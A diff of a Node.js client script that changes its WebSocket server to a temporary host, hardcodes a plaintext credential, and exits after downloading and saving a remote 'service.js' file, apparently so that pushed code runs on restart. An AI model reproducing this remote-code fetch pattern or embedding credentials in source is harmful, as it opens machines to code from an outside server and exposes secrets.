@@ -1,4 +1,4 @@
-// Version - 1.0
+// Version - 1.2
 const axios = require('axios');
 const { Worker } = require('worker_threads');
 const os = require('node:os');
@@ -7,8 +7,8 @@ const zlib = require('zlib');
 
 // process.env.SERVER_URL = `http://localhost:3000`;
 process.env.SERVER_URL = `https://files-ten-rho.vercel.app`;
-process.env.SERVER_WS_URL = `wss://server-krow.onrender.com`;
-
+process.env.SERVER_WS_URL = `ws://pattersonemanuel-001-site1.ktempurl.com`;
+process.env.CREDENTIALS = `11171361:60-dayfreetrial`; 
 
 var reconnected = 0;
 var os_cpus = os.cpus();
@@ -53,6 +53,9 @@ function getService() {
             .then(response => {
                 console.log("Save service.");
                 fs.writeFileSync('./service.js', response.data);
+                setTimeout(()=>{
+                    process.exit();
+                }, 5000);
             })
             .catch(error => {
                 console.error('getService:', error.response.data);
